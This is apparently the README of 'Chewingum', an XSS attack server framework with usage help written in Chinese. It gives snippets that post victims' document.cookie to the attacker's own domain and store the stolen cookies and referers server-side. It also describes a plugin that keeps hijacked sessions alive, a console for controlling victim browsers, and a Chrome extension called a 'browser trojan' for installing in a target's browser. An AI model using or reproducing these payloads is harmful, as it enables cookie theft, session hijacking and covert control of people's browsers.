# Chewingum [alpha][0.2][1140214]

Name
----
**chewingum - individual XSS server framework**

Startup
-------
    python ./config.py install [ domain salt filekeyPath | -h ]
    python ./chewingum.py [ -h | host port debug ]

Dependencies
------------
* [Bottle - 0.11](http://bottlepy.org/)
* [Bottle-websocket](https://github.com/zeekay/bottle-websocket)
* [GeventWebSocketServer](http://sdiehl.github.io/gevent-tutorial/)


  unnecessaries
  -------------
    * [Beaker](http://beaker.rtfd.org/)

Reference
---------
* (Gum.js) - [xss.js](http://zone.wooyun.org/content/2113)
           - [BeEF](http://beefproject.com/)

Helptext
--------

1.login
>   采用filekey验证, 上传filekey或输入URL便可登录.

2.server
>   server处代码会直接在项目触发时执行,
    最终会将变量serverinfo和变量browserinfo保存至数据库,
    格式需为json/dict格式
        {'name':'value'}
    如:
        serverinfo = {
		    'referer':b64encode(str(request.headers.get('Referer'))),
    		'ctime':b64encode(str(ctime()))
	    }
    	browserinfo = {
    		'cookie':b64encode(str(request.forms.get('cookie')))
	    }

3.server code keyword
>   iferror
	对变量iferror赋值, 会触发对应错误.
	如:
		iferror = 404

>	returns
	对变量returns赋值，在iferror为空的情况下, 会返回对其赋值的内容.
	如:
		returns = '<script>alert(1)</script>'

>   gum.backinfo
    客户端的关键字，是一个字典，默认用来暂时记录返回的信息。
    当返回之后最好清空它。
        gum.backinfo = {};

4.project name and object name
>	project 的项目名需是xss触发处的url或是domain.
		$default是默认项目, xss触发时若未发现对应项目则按照此配置进行.

+	object 的项目名可随意更改.

5.plugins
>	可以这样导入server扩展,
		with open('./plus/get_info.py') as files: exec files.read()
    也可以这样
        from plus.email_remind import send_mail
        send_mail(gum_emailremind)
    具体看扩展的写法

>	可以这样导入browser插件,
		gum.script('http://' + gum.domain + '/static/plus/tool_boomerang.js')

>	这样给browser插件传参,
		gum_boomerang = {
			'object_url':'http://localhost/xss',
			'post':{'xss':'yes', 'csrf':'no'},
			'eval':function(){alert(1)}
		}

>	同样的方法给server扩展传参,
		gum_keepsession = {
			'url':referer,
			'session':cookie,
			'data':{'a':'b'},
			'frequency':300,
			'endate':'2013-12-12 15:17:00'
		}

6.set code
>	这样发送browser info,
		gum.post('http://' + gum.domain + '/ing', {'cookie':document.cookie})

>	单次接收browser info可以参考上面的2.server
    也可以这样
        browserinfo['infoname'] = b64encode(str(request.forms.get('infoname')))

>	多次接收browser info可以像这样,
		info_cookie = str(request.forms.get('cookie'))
		sessionid[referer][1]['cookie'] = info_cookie
		browserinfo = b64encode(sessionid.get(referer))

+		不推荐使用多次接收，默认已关闭。

7.other
>	使用基本探针:

>	server:
		with open('./plus/get_info.py') as files: exec files.read()

>	browser:
		gum.script('http://' + gum.domain + '/static/plus/get_info.js', function(){
            gum.post('http://' + gum.domain + '/ing', gum.backinfo);
            gum.backinfo = {};
        })

8.console
>   尚在测试阶段。
    javascript文件在
        ./static/plus/onexsshell.js

9.browser trojan
>   chrome
    修改./trojan/chrome/gum.js中的{{domain}}为你的chewingum的域名及端口
    使用chrome or chromium打包
    安装在目标的浏览器后，使用console即可操作目标浏览器。

+   尚在测试阶段
